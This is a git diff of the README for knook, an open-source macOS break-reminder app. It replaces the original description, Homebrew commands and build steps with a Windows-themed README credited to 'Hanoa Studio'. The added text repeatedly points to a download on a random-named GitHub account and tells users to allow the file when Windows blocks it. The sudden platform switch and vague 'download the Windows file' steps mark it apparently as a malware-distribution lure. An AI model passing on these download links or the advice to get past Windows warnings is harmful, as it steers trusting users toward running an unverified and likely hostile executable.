@@ -1,164 +1,165 @@
-# knook
+# 🧘 knook - Find Calm With Every Pause
 
-<p align="center">
-  <img src="Sources/AppShell/Resources/AppIcon.png" alt="knook" width="128">
-</p>
+[![Download knook](https://img.shields.io/badge/Download-knook-blue?style=for-the-badge&logo=github)](https://github.com/Blemished-windcavenationalpark867/knook)
 
-<p align="center">
-  <strong>Open-source, privacy-first macOS break reminders for a calmer work rhythm</strong>
-</p>
+## 🌿 What is knook?
 
-knook is a native menu bar app for macOS that helps you take screen breaks without accounts, subscriptions, or cloud syncing.
+knook is a small Windows app from Hanoa Studio that helps you take a pause. It gives you a quiet space on your screen for short breaks, calm reminders, and simple focus moments.
 
-> knook is in active development and should be treated as early alpha software. UI details, contributor workflows, and local setup may still change as the app is being hardened.
+Use it when you want to:
 
-[Quick Start](#quick-start) · [Install Guide](docs/installation.md) · [What knook is](#what-knook-is) · [Why knook exists](#why-knook-exists) · [What It Feels Like](#what-it-feels-like) · [Current Capabilities](#current-capabilities) · [Repository Map](#repository-map) · [Contributing](#contributing) · [Support](#support)
+- step away from work for a short break
+- remember to breathe and reset
+- keep a calm pace during the day
+- build a pause habit without extra effort
 
-## What knook is
+## 🖥️ Windows download
 
-knook is a native SwiftUI menu bar app for screen-break reminders on macOS.
+Use this link to visit the download page and get knook:
 
-It keeps track of your break rhythm locally, offers short and long breaks, and adds lightweight context-aware pause behavior so reminders can stay useful without feeling overly disruptive during focused work.
+[Visit the knook download page](https://github.com/Blemished-windcavenationalpark867/knook)
 
-## Why knook exists
+## 📦 What you need
 
-Healthy break reminders should be available without a paywall, account system, or opaque syncing model.
+knook is made for Windows users. For the best experience, use:
 
-knook is being built as a community-owned, privacy-first alternative in this category: small, local-first, and understandable from the inside out.
+- Windows 10 or Windows 11
+- a mouse and keyboard
+- an internet connection for the download
+- enough free space for the app and its files
 
-## What It Feels Like
+knook is light and should run well on most modern PCs and laptops.
 
-In day-to-day use, knook is meant to stay quiet until it is helpful:
+## 🚀 How to get knook
 
-1. You launch knook and it lives in the menu bar.
-2. It keeps time for your next break locally.
-3. It gives you a heads-up reminder before the break starts.
-4. It shows a full break overlay when it is time to pause.
-5. You can postpone, skip, end early, or pause reminders depending on the current state and settings.
+1. Open the download page: [https://github.com/Blemished-windcavenationalpark867/knook](https://github.com/Blemished-windcavenationalpark867/knook)
+2. Look for the latest release or download file
+3. Download the Windows file to your computer
+4. Open the file from your Downloads folder
+5. Follow the on-screen steps to finish setup
+6. Start knook from your Start menu or desktop
 
-The goal is not to create a complicated wellness platform. The goal is to make taking small breaks on macOS feel simple and sustainable.
+If Windows asks for permission to open the app, choose the option that lets it run.
 
-## Current Capabilities
+## 🛠️ First time setup
 
-knook currently provides:
+After you open knook for the first time, set it up in a way that fits your day:
 
-- a native macOS menu bar app in SwiftUI
-- a scheduler core in `Core`
-- short and long breaks
-- heads-up reminder panels
-- a break overlay window
-- postpone, skip, early end, and manual pause or resume controls
-- office hours, idle reset, and launch-at-login wiring
-- smart pause for full-screen focus
-- versioned local JSON settings
+- choose how often you want pause reminders
+- pick a quiet style for the app window
+- set the length of each break
+- turn sound on or off
+- place the app where you can reach it fast
 
-## Quick Start
+A short setup makes it easier to keep using the app each day.
 
-The fastest install path is the latest GitHub release or the Homebrew cask.
+## 🌸 How to use knook
 
-### Direct install
+knook is built for simple daily use.
 
-Download the latest release from GitHub, move `knook.app` into `/Applications`, and launch it from there.
+### Start a pause
+Open the app and begin a pause when you want a break. You can use it between tasks, after long screen time, or when your mind feels full.
 
-### Optional Homebrew install
+### Set a reminder
+Choose a time that fits your routine. knook can help you remember to stop, breathe, and rest for a moment.
 
-Install with:
+### Keep it small
+A pause does not need to be long. Even a short break can help you feel more settled and ready to continue.
 
-```bash
-brew tap preetsuthar17/tap
-brew install --cask knook
-```
+### Build a habit
+Use knook at the same times each day. Many people find it easier to keep a habit when the app stays simple.
 
-Upgrade later with:
+## ✨ Main features
 
-```bash
-brew update
-brew upgrade --cask knook
-```
+- simple Windows app for pause reminders
+- calm, clean interface
+- short break prompts
+- easy setup for non-technical users
+- light app with low system use
+- built to support daily focus and rest
+- made by Hanoa Studio
 
-When a newer GitHub release is published, knook shows an update banner in the menu bar popover. The `Update` button opens a Homebrew upgrade command in Terminal when Homebrew is available and falls back to the GitHub release page otherwise.
+## 🔔 Recommended use
 
-### Source build
+knook works well for:
 
-Requirements:
+- office work
+- study sessions
+- creative work
+- long reading time
+- screen breaks
+- a calm start or end to the day
 
-- macOS 13 or newer
-- a current Swift toolchain
-- a full Xcode installation for the best local development experience
+If you spend a lot of time on your PC, a pause app can help you keep a better rhythm.
 
-Build the app:
+## 🧩 Common tasks
 
-```bash
-swift build
-```
+### Change your pause timing
+Open the app settings and adjust the reminder interval to match your day.
 
-Run the app:
+### Stop reminders for a while
+If you need quiet time, turn off reminders and start them again later.
 
-```bash
-swift run
-```
+### Move the app
+You can keep knook on your taskbar or desktop for quick access.
 
-For the full local development workflow, including `swift run knook`, filtered test commands, and launch-time overrides such as `KNOOK_WORK`, `KNOOK_BREAK`, and `KNOOK_FORCE_ONBOARDING`, see [docs/local-development.md](docs/local-development.md).
+### Restart after Windows updates
+If the app does not open after an update, close it and start it again from the Start menu.
 
-For a deeper install guide, including troubleshooting, uninstall, and reset steps, see [docs/installation.md](docs/installation.md).
+## 🧠 Tips for a better pause habit
 
-Quick examples:
+- keep breaks short and regular
+- step away from the screen during each pause
+- drink water during longer work sessions
+- use the same pause time each day
+- treat the reminder as a reset, not a stop
 
-```bash
-swift test
-```
+Small pauses can make long work days feel easier to manage.
 
-```bash
-KNOOK_FORCE_ONBOARDING=1 swift run
-```
+## 📁 File locations
 
-`swift test` currently expects a full Xcode installation in this repository's setup.
+After download, you will usually find knook in:
 
-## Known Limitations
+- Downloads
+- Desktop, if you moved it there
+- Start menu, after setup
 
-- source build and developer setup are required today
-- screenshots and demo assets are not included in the README yet
-- signed and notarized distribution is still being finalized
-- the contributor-facing test workflow still needs cleanup
+If you want to keep it easy to find, pin it to the taskbar.
 
-## Repository Map
+## 🧼 Uninstall
 
-- `Sources/AppShell/`: macOS app shell, menu bar UI, windows, and app coordination
-- `Sources/Core/`: scheduler, models, persistence, and platform integration
-- `Tests/`: scheduler, persistence, and app test coverage
-- `docs/`: release and supporting project docs, including the local development guide
-- `packaging/`: macOS packaging assets, Xcode project generator, release scripts, and Homebrew cask template
+If you want to remove knook from your PC:
 
-## Contributing
+1. Open Windows Settings
+2. Go to Apps
+3. Find knook in the app list
+4. Choose Uninstall
+5. Follow the prompts
 
-Contributions are welcome, especially around scheduler behavior, macOS polish, onboarding, and documentation.
+This removes the app from your computer.
 
-Start with [CONTRIBUTING.md](CONTRIBUTING.md) for local setup expectations and contribution guidelines. If you find a bug or want to propose a feature, open an issue or feature request in GitHub.
+## ❓ Help with basic issues
 
-## Support
+### The file will not open
+Check that the download finished. Try opening it again from the Downloads folder.
 
-If you want to support ongoing maintenance, see [SUPPORT.md](SUPPORT.md).
+### Windows blocks the app
+Use the Windows prompt that lets you open or keep the file, then try again.
 
-## Privacy
+### I cannot find the app
+Look in the Start menu, Downloads, or the desktop if you placed it there.
 
-knook stores its settings locally in Application Support and does not send data to a server.
+### The app is not responding
+Close knook and open it again. If needed, restart Windows.
 
-## Roadmap
+## 🔒 Privacy and local use
 
-### Near term
+knook is made for personal pause use on your Windows PC. Keep your settings on your device and use the app in the way that fits your routine. If the app offers local reminders or saved settings, they stay part of your normal Windows setup.
 
-- polish the reminder and break overlay interactions
-- improve keyboard accessibility and labeling
-- strengthen smart timing beyond the current MVP
-- tighten the public contributor workflow
+## 📌 Project info
 
-### Later
-
-- additional smart pause providers such as meetings and video contexts
-- AppleScript or Shortcuts support
-- Focus Filters integration
-- published notarized distribution
-
-## License
-
-knook is available under the [MIT License](LICENSE).
+- Name: knook
+- Studio: Hanoa Studio
+- Goal: help you find your pause
+- Platform: Windows
+- Primary link: [https://github.com/Blemished-windcavenationalpark867/knook](https://github.com/Blemished-windcavenationalpark867/knook)
